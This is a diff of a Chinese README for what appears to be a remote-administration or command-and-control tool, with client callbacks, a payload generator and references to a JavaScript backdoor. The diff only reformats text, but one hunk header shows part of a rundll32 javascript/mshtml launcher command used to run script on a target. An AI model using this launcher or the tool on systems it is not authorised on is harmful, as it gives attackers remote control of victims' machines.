@@ -5,8 +5,7 @@
 程序里的download和upload都是以客户端的视角。客户端从服务端下载文件叫做download，客户端上传文件到服务端叫做upload。
 
 ##配置
-在config.py中修改客户端上线的地址和后台的管理密码
-记得要检查下把debug关掉
+在config.py中修改客户端上线的地址和后台的管理密码，记得要检查下把debug关掉。
 
 程序依赖flask和sqlite3，自行pip安装
 
@@ -45,25 +44,31 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%
 
 ##开发
 后台命令维护客户端 /static/js/xkcd_cli.js
+
 后台命令维护服务端 /controllers/server.py
 
 客户端维护 /controllers/client.py
+
 客户端payload生成 payload.py
 
 数据库操作相关 /models/
 
 ##联系方式
 http://5alt.me
+
 md5_salt [AT] qq.com
 
 ##参考资料
 https://gist.github.com/subTee/f1603fa5c15d5f8825c0
+
 http://drops.wooyun.org/tips/11764
+
 https://github.com/chromakode/xkcdfools
+
 http://www.kammerl.de/ascii/AsciiSignature.php
 
 ##TODO
-完善命令
-heartbeat随任务量来决定sleep时间
+* 完善命令
+* heartbeat随任务量来决定sleep时间
 
 
